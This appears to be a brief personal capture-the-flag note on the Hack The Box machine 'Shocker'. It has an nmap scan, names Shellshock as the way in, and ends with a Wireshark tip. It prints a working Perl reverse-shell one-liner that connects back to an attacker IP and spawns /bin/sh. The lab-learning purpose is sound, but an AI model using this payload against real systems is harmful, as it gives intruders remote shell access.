# Shocker

Shocker

Tuesday, 1 February 2022

1:16 am

**\[Shocker]{.underline}**

Nmap -O -sV -T4 -p- 10.10.10.56

Nmap scan report for 10.10.10.56

Host is up (0.019s latency).

Not shown: 65533 closed ports

PORT     STATE SERVICE VERSION

80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))

2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)

ShellShock is the exploit here, referred to as the answer because I could not for the life of me get it.&#x20;

export RHOST=10.10.16.3

export RPORT=12345

* perl -e 'use Socket;$i="$ENV{RHOST}";$p=$ENV{RPORT};socket(S,PF\_INET,SOCK\_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr\_in($p,inet\_aton($i)))){open(STDIN,">\&S");open(STDOUT,">\&S");open(STDERR,">\&S");exec("/bin/sh -i");};'

From here we are able to escalate our privileges.

Learn to use wireshark to intercept packets and see instead, sometimes there are shellshocker things going by.

For example, I saw that the web page was sending packets randomly and refreshing time and time again, use wireshark to see what's up with that sometimes.
